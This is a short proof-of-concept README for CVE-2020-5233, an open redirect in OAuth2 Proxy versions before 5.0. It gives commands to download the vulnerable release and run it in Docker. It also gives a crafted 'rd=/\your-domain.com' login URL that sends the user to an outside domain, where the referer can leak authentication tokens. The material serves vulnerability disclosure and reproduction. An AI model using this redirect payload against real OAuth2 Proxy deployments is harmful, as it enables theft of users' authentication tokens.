# CVE-2020-5233

OAuth2 Proxy before 5.0 has an open redirect vulnerability. Authentication tokens could be silently harvested by an attacker. This has been patched in version 5.0.

# PoC

Replace `CLIENT_ID` and `CLIENT_SECRET` in docker-compose.yml with your project's.

```bash
wget https://github.com/pusher/oauth2_proxy/releases/download/v4.1.0/oauth2_proxy-v4.1.0.linux-amd64.go1.13.5.tar.gz
tar xvfz oauth2_proxy-v4.1.0.linux-amd64.go1.13.5.tar.gz
mv oauth2_proxy-v4.1.0.linux-amd64.go1.13.5/oauth2_proxy .

docker-compose up
```

Access to `https://app.example.com/oauth2/start?rd=/\your-domain.com` and logged in.  
Depending on your browser, a `referer` containing the token remains at `your-domain.com` .

# References

- https://github.com/pusher/oauth2_proxy/security/advisories/GHSA-qqxw-m5fj-f7gv
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5233

